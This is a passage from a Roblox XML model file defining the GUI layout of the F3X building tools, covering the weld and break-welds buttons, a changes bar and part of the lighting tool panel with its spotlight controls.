									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX6BFE5BFD0BF241B7B1F045D9FA789EEE">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Interface</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBXFE8D1DF2DE00432D834C9CE8DB87F691">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.400000006</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">WeldButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.479999989</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">WELD TO LAST</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.850000024</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX943819B72E4B449A8EF68A5624B127F5">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.150000006</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="TextButton" referent="RBX84A5D39C6097497A8EA068ED90BC16F6">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.400000006</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">BreakWeldsButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.519999981</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.479999989</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">BREAK WELDS</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.850000024</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX15950D5D0109442FBD6B4163FB9D4B90">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.150000006</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXF29B801952064AFDBAA22B9ECB6E0039">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Changes</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX48A9F341AD514F8CBFA43865291DAC1C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX7CF2DFCA3EAB40B6B1DE117AF489C856">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXABDFA02533684F0F9D9111894EB459A3">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTLightingToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>95</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXEEBFF9AB520945D7ACDC9A5A0EAA0B44">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">BottomColorBar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>1</YS>
										<YO>-2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>2</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX10555F66A8644E6C8B2477F831F6004F">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXFBD5D2F83D5045EA8591F1DC275023DB">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXB25C7B875AE54372AC9B99516C2CD1F9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">LIGHTING TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX59BFBF464ADB4624A5C1270066D0CAC0">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX970B0D5291B3442A91FC2D9B73D3C77A">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.675000012</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Spotlight</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX2326F4EE04304812A25F8A03535D92AE">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Spotlight</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBX8CA66339BAAC4F1BA7696FD207AB6A3A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=134367382</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ArrowButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX2DF6C900C4834047AF419DB958781EF9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294946364</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX316BEF5977AD4FA9B100DD8FAD85893D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">AddButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXDC27E459333248A9A1B4AF188B7B875F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">RemoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>127</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>58</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX2F6F5A72A16243BBBDC119C633F14217">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
